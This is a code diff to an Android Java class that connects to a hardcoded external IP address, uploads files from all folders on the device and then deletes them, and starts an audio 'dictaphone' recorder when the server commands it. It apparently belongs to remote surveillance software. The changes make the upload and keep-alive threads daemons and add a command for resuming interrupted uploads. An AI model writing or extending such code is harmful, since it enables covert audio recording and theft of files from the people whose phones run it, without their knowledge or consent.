@@ -51,9 +51,6 @@ public class DownloadFileRun extends Thread {
     }
     //шлем файлы из папок на сервер
     public void start() {
-        Thread t = Thread.currentThread();
-        String name = t.getName();
-        Log.e(Msg, "name = " + name);
         Log.e(Msg, "DownloadFileRun ");
         is_downloadFlag = new AdapterDownloadFlag();
         String server = "185.65.244.125";
@@ -63,7 +60,7 @@ public class DownloadFileRun extends Thread {
         try {
             EventBus.getDefault().register(this);
             socket = new Socket();//(server, port);
-            socket.connect(new InetSocketAddress(server, port),2000);
+            socket.connect(new InetSocketAddress(server, port),5000);
             socket.setSoTimeout(25000);
             dos = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));
             oaut();
@@ -76,6 +73,7 @@ public class DownloadFileRun extends Thread {
                 is_downloadFlag.setTreadIsWork(false);
                 boolean is_KeepConnectionFlag = true;
 
+                SendFileToServer dwnloadFile = null;
 
                 while ((line = reader.readLine()) != null) {
 
@@ -88,6 +86,11 @@ public class DownloadFileRun extends Thread {
                         Thread startDelete = new Thread(deleteSendOutFiles);
                         //поток для удаления файлов
                         startDelete.start();
+//                        try {
+//                            startDelete.join();
+//                        } catch (InterruptedException e) {
+//                            Log.i(Msg, "Error DownloadFileRun run startDelete "+e) ;
+//                        }
                     }
 
                     if (line.equals("isConnect") && !is_downloadFlag.getTreadIsWork()
@@ -98,6 +101,7 @@ public class DownloadFileRun extends Thread {
                         KeepConnection keep_con = new KeepConnection(dos, is_downloadFlag,
                                 is_KeepConnectionFlag, context);
                         keep_con.setName("KeepConnection");
+                        keep_con.setDaemon(true);
                         keep_con.start();
 
                         //Log.e(Msg, "Название потока поддержки свъязи с сервером "+ keep_con.getName().toString());
@@ -107,10 +111,11 @@ public class DownloadFileRun extends Thread {
                         //начать поддержку соединения
                         if (allFoldersFiles != null) {
                             //отправка в новом потоке
-                            SendFileToServer dwnloadFile = new SendFileToServer(allFoldersFiles,
+                            dwnloadFile = new SendFileToServer(allFoldersFiles,
                                     socket, dos, is_downloadFlag);
                             Thread startDownlow = new Thread(dwnloadFile);
                             //поток для загрузки файлов на сервер
+                            startDownlow.setDaemon(true);
                             startDownlow.start();
                         }
                     }
@@ -121,8 +126,23 @@ public class DownloadFileRun extends Thread {
                             dict.setName("DictaphoneRec");
                             dict.start();
                             //Log.i(Msg, "  ДИКТОФОН ВКЛЮЧЕН");
-                            dos.writeUTF("dictaphone_on");
-                            dos.flush();
+                            if (!is_downloadFlag.getTreadIsWork()) {// если не идет загрузка данных
+                                dos.writeUTF("dictaphone_on");
+                                dos.flush();
+                            }
+                        } else if(new ThreadIsAliveOrNot("DictaphoneRecordStop").liveORnot()){
+                            if (!is_downloadFlag.getTreadIsWork()) {// если не идет загрузка данных
+                                dos.writeUTF("dictaphone_already_on");
+                                dos.flush();
+                            }
+                        }
+                    }
+
+                    if (line.startsWith("additional_load")) {
+                        if(!line.equals("")){
+                            //ответ от сервера потоку dwnloadFile (говорим загружать файл или докачивать)
+                            dwnloadFile.setMsg(line.split("\\s+"));
+
                         }
                     }
 
@@ -142,7 +162,7 @@ public class DownloadFileRun extends Thread {
 
     private void sockClose(){
         try {
-            reader.close();socket.close();dos.close();
+            reader.close();dos.close();socket.close();
 
         } catch (IOException e) {
             Log.e(Msg, "Eror3 DownloadFileRun sockClose"+e);
